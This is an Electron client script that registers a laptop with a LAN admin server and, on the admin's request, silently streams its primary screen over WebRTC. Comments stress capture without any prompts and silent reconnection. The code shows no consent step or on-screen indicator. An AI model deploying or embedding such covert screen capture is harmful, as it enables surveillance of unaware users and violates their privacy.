// =========================================================================
// VERY IMPORTANT:
// Change this to the IP Address of your main laptop (Anzee Laptop)
// Example: const SERVER_URL = "http://192.168.1.15:3000";
// =========================================================================
const SERVER_URL = "http://192.168.1.42:3000"; // REPLACE THIS BEFORE BUILDING EXE!

let socket;
let peerConnection;
const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
let localStream;

window.onload = async () => {
    // Dynamically load socket.io-client from the server
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';

    script.onload = async () => {
        socket = io(SERVER_URL);

        // Get the computer name (e.g., "Aqu-Laptop")
        const hostname = await window.electronAPI.getHostname();

        socket.on('connect', () => {
            console.log("Connected to Admin Server");
            // Register this laptop to the Admin Dashboard
            socket.emit('register-client', hostname);
        });

        // When the admin clicks "Watch" on the dashboard
        socket.on('request-offer', async (adminId) => {
            try {
                // Automatically get all screens
                const sources = await window.electronAPI.getSources();
                // Select the primary screen (first one)
                const mainScreen = sources[0];

                // Capture the screen without any prompts
                localStream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: {
                        mandatory: {
                            chromeMediaSource: 'desktop',
                            chromeMediaSourceId: mainScreen.id,
                            minWidth: 1280,
                            maxWidth: 1920,
                            minHeight: 720,
                            maxHeight: 1080
                        }
                    }
                });

                if (peerConnection) peerConnection.close();
                peerConnection = new RTCPeerConnection(configuration);

                // Send ICE candidates to admin
                peerConnection.onicecandidate = e => {
                    if (e.candidate) {
                        socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
                    }
                };

                // Add the screen video track
                localStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, localStream);
                });

                // Create and send WebRTC offer
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                socket.emit('offer', { offer: offer, targetId: adminId });

            } catch (e) {
                console.error("Silent screen capture failed", e);
            }
        });

        socket.on('answer', async (data) => {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
        });

        socket.on('ice-candidate', async (data) => {
            if (peerConnection) {
                await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
            }
        });
    };

    // If server is not running right now, retry every 5 seconds silently
    script.onerror = () => {
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    };

    document.head.appendChild(script);
};